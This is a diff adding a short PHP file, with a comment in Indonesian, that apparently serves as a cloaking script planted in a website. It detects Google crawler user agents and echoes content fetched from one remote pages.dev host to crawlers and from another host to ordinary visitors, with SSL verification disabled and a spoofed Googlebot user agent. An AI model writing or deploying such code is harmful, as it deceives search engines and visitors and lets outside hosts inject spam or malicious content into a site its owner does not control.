@@ -1,0 +1,31 @@
+<?php
+function get_raw($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+    $out = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return ($code == 200) ? $out : '';
+}
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// Deteksi semua bot Google
+$isGoogle = stripos($ua, 'Googlebot') !== false
+         || stripos($ua, 'Google-InspectionTool') !== false
+         || stripos($ua, 'AdsBot-Google') !== false
+         || stripos($ua, 'GoogleOther') !== false
+         || stripos($ua, 'APIs-Google') !== false
+         || stripos($ua, 'Storebot-Google') !== false
+         || stripos($ua, 'Googlebot-Image') !== false
+         || stripos($ua, 'Googlebot-News') !== false;
+
+if ($isGoogle) {
+    echo get_raw('https://b5d70450.hitamnya.pages.dev');
+} else {
+    echo get_raw('https://a2965ada.putihnya.pages.dev');
+}
